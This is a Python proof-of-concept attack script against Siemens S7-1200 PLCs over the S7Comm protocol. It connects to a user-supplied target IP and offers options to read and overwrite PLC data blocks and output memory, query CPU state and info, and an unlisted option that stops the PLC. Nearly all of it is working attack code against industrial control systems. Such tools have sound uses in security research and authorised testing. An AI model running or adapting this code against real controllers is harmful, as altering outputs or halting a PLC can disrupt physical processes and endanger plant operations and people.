#!/usr/bin/python -tt

"""
ATTACK PROOF-OF-CONCEPT CODE UNSANCTIONED USE FORBIDDEN!

S7Comm attack aginst S7-1200 PLC.

 Tested against PLC S7-1200, CPU 1215C:
  1. PLC PUT/GET communication has to be enabled  (http://snap7.sourceforge.net/snap7_client.html);
  2. Will work for 'Full access', 'Read access', and 'HMI access' settings.

 Depends on:
  1. Snap7 (http://snap7.sourceforge.net/)
  2. Snap7-Python library (http://python-snap7.readthedocs.org/)

Resources:
  1. Snap7 Client: http://snap7.sourceforge.net/snap7_client.html
  2. Snap7 1200 notes: http://snap7.sourceforge.net/snap7_client.html#1200_1500
  3. S7comm explained http://gmiru.com/article/s7comm/
"""

import snap7
import sys

target_ip = input('Enter target IP: ')

plc = snap7.client.Client()
plc.connect(str(target_ip),0,1)

print('Connected to %s' % target_ip)
print('Default port 102')
print(' ')

print('Chose what to do:')
print('1. Read from DB')
print('2. Writing to DB')
print('3. Get CPU state')
print('4. Get CPU info')
print(' ')

item = int(input('Chose option: '))
print(' ')


def cpu_info (target):
	try:
		res = target.get_cpu_info()
	except Exception as err:
		return err
	return res

def cpu_state (target):
	try:
		res = target.get_cpu_state()
	except Exception as err:
		return err
	return res

def read_data(target, area, db_num, mem_start, size):

	#area - is Memory Areas (see s7_protocol_const.md). Example: 0x82 - Outputs (Q)
	#db_num - PLC program block DB number. If inputs or outputs or similar memory is accesed db_num=0
	#mem_start - start of the memory, but PLC need to be configured for memory to be non-optimized, only then there is memory ofset.

	try:
		res = target.read_area(area, db_num, mem_start, size)
	except Exception as err:
		return err
	return res

def write_data(target, area, db_num, mem_start, data):
	#area - is Memory Areas (see s7_protocol_const.md)  Example: 0x82 - Outputs (Q)
	#db_num - PLC program block DB number. If inputs or outputs or similar memory is accesed db_num=0
	#mem_start - start of the memory, but PLC need to be configured for memory to be non-optimized, only then there is memory ofset.
	#data - bytes to write. First get byte (read_from) then change specific bits in that data and inject back

	try:
		res = target.write_area(area, db_num, mem_start, data)
	except Exception as err:
		return err
	return res


def stop(target):
	try:
		res = target.plc_stop() 
	except Exception as err:
		return err
	return res

if item == 1:
	area = bytearray(input('Memory area in byte stream(\\x00\\x00) : ').encode())
	db_num = int(input('Data Block number in decimal: '))
	mem_start = int(input('Memory starting position in decimal: '))
	size = int(input('How many bytes to read in decimal: '))
	print(read_data(plc, area, db_num, mem_start, size))

elif item == 2:
	area = bytearray(input('Memory area in byte stream(\\x00\\x00) : ').encode())
	db_num = int(input('Data Block number in decimal: '))
	mem_start = int(input('Memory starting position in decimal: '))
	data = bytearray(input('Data to write in byte stream (\\x00\\x00) : ').encode())
	print(write_data(plc, area, db_num, mem_start, data))

elif item == 3:
	print(cpu_state(plc))

elif item == 4:
	print(cpu_info(plc))

elif item == 5:
	print(stop(plc))

else:
	print('No such option! Exiting')


plc.disconnect()
plc.destroy()



